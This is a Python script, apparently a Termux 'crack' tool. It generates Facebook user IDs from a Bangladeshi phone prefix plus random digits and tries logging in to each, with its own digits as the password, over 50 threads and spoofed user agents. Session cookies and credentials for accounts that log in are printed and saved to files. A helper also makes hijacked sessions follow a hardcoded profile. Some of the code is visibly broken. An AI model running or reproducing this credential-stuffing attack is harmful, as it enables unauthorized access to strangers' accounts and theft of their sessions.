import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\\033[1;91m [✔] Sorry there is no Active  Apk ')
    else:
        print(f'\r \033[1;92m[✔] Your Active Apps :{WHITE}' )
        for i in range(len(game)):
            print(f"\r [%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\\033[1;91m [✔] Sorry there is no Expired Apk\n')
    else:
        print(f'\\033[1;92m [✔] Your Expired Apps   :{WHITE}')
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU

my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo ="""

\033[1;32m╔════════════════════════════════════════════════════════════╗\033[1;93m
\033[1;32m║	             \033[1;93m ─━㋱ASSALAMUALAIKUM㋱━─\033[1;32m 	             ║
\033[1;32m╔════════════════════════════════════════════════════════════╗
\033[1;32m║\033[0;32m/$$$$$$$           /$$                                      \033[1;32m║
\033[1;32m║\033[0;31m| $$__  $$         | $$                                     \033[1;32m║
\033[1;32m║\033[0;32m| $$  \ $$ /$$$$$$$| $$$$$$$  /$$   /$$  /$$$$$$$  /$$$$$$  \033[1;32m║
\033[1;32m║\033[0;33m| $$$$$$$//$$_____/| $$__  $$| $$  | $$ /$$_____/ /$$__  $$ \033[1;32m║
\033[1;32m║\033[0;34m| $$____/|  $$$$$$ | $$  \ $$| $$  | $$| $$      | $$  \ $$ \033[1;32m║
\033[1;32m║\033[0;35m| $$      \____  $$| $$  | $$| $$  | $$| $$      | $$  | $$ \033[1;32m║
\033[1;32m║\033[0;36m| $$      /$$$$$$$/| $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$/ \033[1;32m║
\033[1;32m║\033[1;31m|__/     |_______/ |__/  |__/ \____  $$ \_______/ \______/  \033[1;32m║
\033[1;32m║   \033[1;31m                           /$$  | $$                     \033[1;32m║
\033[1;32m║      \033[1;31m                       |  $$$$$$/                     \033[1;32m║
\033[1;32m║         \033[1;31m                     \______/                      \033[1;32m║
\033[1;32m╚════════════════════════════════════════════════════════════╝                              
\033[1;32m╔════════════════════════════════════════════════════════════╗
\033[1;32m║\033[0;32m          𝐓𝐄𝐀𝐌 𝐍𝐀𝐌𝐄      ➣ 𝐓𝐄𝐀𝐌 𝐍𝐒𝐍                         \033[1;32m║
\033[1;32m║\033[0;31m          𝐀𝐔𝐓𝐇𝐎𝐑         ➣ 𝐏𝐒𝐇𝐘𝐂𝐎 𝐑𝐎𝐒𝐓𝐄𝐀𝐑                   \033[1;32m║
\033[1;32m║\033[0;33m          𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊       ➣ 𝐏𝐒𝐇𝐘𝐂𝐎 𝐑𝐎𝐒𝐓𝐄𝐀𝐑                   \033[1;32m║
\033[1;32m║\033[0;34m          𝐆𝐈𝐓𝐇𝐔𝐁         ➣ 𝐏𝐒𝐇𝐘𝐂𝐎-23                        \033[1;32m║
\033[1;32m║\033[0;35m          𝐖𝐇𝐀𝐓𝐒 𝐀𝐏𝐏      ➣ 01*********                      \033[1;32m║
\033[1;32m║\033[0;36m          𝐓𝐎𝐎𝐋 𝐍𝐀𝐌𝐄      ➣ 𝐑𝐀𝐍𝐃𝐎𝐌                           \033[1;32m║
\033[1;32m║\033[0;31m          𝐓𝐎𝐎𝐋 𝐒𝐓𝐔𝐓𝐀𝐒    ➣ 𝐅𝐑𝐄𝐄                             \033[1;32m║
\033[1;32m║\033[0;32m          𝐕𝐀𝐑𝐒𝐈𝐎𝐍        ➣ 0.0.0                            \033[1;32m║
\033[1;32m║\033[0;33m          𝐒𝐄𝐑𝐕𝐄𝐑         ➣  𝐃𝐀𝐓𝐀-𝐖𝐈𝐅𝐈                       \033[1;32m║
\033[1;32m╚════════════════════════════════════════════════════════════╝"""                             
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
 
try:
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Loading To Next...')
    time.sleep(3)
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n \033[1;91m[\033[1;92m✔\033[1;91m] No internet connection ...')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2 = []
ugen = []
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
    
# APK CHECK
def xr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    jalan('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mBD CODE : \033[1;97m016 \033[1;92m, \033[1;97m017 \033[1;92m, \033[1;97m018 \033[1;92m, \033[1;97m019')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    code = input('\033[97;1m[\033[92;1m?\033[97;1m]\033[97;1mENTER CODE  \033[38;5;196m:\033[97;1m ')
    os.system('clear')
    print(logo)
    limit = int(input(' \033[97;1m[\033[92;1m✓\033[97;1m]\033[1;97mEXAMPLE    \033[38;5;196m: \033[1;35m1000\033[1;97m/\033[1;34m2000\033[1;97m/\033[1;32m3000\n \033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \n \033[97;1m[\033[92;1m?\033[97;1m]\033[1;97mCRACK LIMIT \033[38;5;196m:\033[97;1m '))  
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    Nayan = []
    print("")
    for bilal in range(passx):
        pww = 0
        Nayan.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	    
	    print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mTOTAL IDS : \033[1;92m'+tl)
	    print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mUSE \033[1;34m[\033[1;32mDATA\033[1;97m/\033[38;5;196mWIFI\033[1;34m] ')
	    print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE ')
	    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in Nayan:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print('\nCRACK PROCESS HAS BEEN COMPLETED ')
    print('\nIDS SAVED IN Nayan_OK.txt')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="111", "Google Chrome";v="111"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5481.223 Safari/537.36',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(' \n\033[1;97m[\033[1;92mNAYAN-OK\033[1;97m]\033[1;92m ' +uid+ '\033[1;91m<>\033[1;92m' +ps+ '\n \033[1;91m[\033[1;92m➡️\033[1;91m]\033[1;92m COOKIES \033[1;91m=\033[1;96m '+coki+'')                
                open('/sdcard/paid-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                #print('[𝑨𝑳𝑰𝑭-CP] ' +uid+ '|' +ps+ '')
                open('/sdcard/paid-cp.txt', 'a').write( uid+' | '+ps+'')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r \033[1;91m[\033[1;97m{uid}\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
        sys.stdout.flush()
    except:
        pass

xr()
